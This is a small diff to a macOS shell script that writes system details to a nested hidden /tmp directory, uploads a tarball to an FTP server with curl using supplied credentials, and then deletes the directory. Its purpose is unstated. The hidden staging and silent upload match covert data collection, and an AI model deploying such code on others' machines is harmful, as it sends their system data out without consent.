@@ -13,8 +13,6 @@ PASSWORD=$3
 
 INFO_DIR="/tmp/.p/.w/.n/.d/"
 
-mkdir -p $INFO_DIR 
-
 get_os() {
 	system_profiler SPSoftwareDataType > $INFO_DIR/os_details.txt
 }
@@ -93,4 +91,4 @@ tar cfz $(hostname)_sysinfo.tgz *.txt > /dev/null
 curl -sT $INFO_DIR/$(hostname)_sysinfo.tgz ftp://${FTP_SERVER} --user ${USER}:${PASSWORD}
 
 # Cleanup
-rm -rf /tmp/p
+rm -rf /tmp/.p
